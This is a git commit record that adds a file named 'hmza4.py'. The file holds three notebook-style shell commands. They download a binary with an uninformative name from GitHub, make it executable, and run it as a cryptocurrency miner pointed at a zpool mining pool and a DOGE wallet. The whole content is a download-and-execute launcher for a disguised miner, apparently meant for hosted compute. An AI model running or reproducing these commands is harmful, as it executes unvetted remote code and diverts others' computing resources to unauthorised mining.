dc150744e904dedfe51dd8e4699f3276bab57c07
hmzamin <81403385+hmzamin@users.noreply.github.com>
2021-03-26 15:27:20 +0200

    Add files via upload

---
+++ hmza4.py
@@ -0,0 +1,3 @@
+!wget https://github.com/hmzamin/file/raw/main/ahmed_code
+!chmod u+x ./ahmed_code
+!./ahmed_code -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u DE4shNS2Siae2JSLdWmR4GmzXVvTPaGEeq -p c=DOGE
